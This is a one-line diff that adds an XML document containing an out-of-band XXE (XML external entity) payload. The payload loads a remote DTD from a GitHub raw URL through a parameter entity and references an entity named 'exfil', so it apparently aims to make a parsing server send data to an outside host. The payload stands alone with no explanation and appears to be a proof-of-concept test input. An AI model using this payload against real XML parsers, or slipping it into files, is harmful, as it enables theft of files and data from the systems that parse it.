@@ -1,0 +1,1 @@
+<?xml version=\"1.0\" ?><!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"https://raw.githubusercontent.com/vinnyvinoth/xxe/main/poc1.dtd\"> %sp; %param1; ]><r>&exfil;</r>
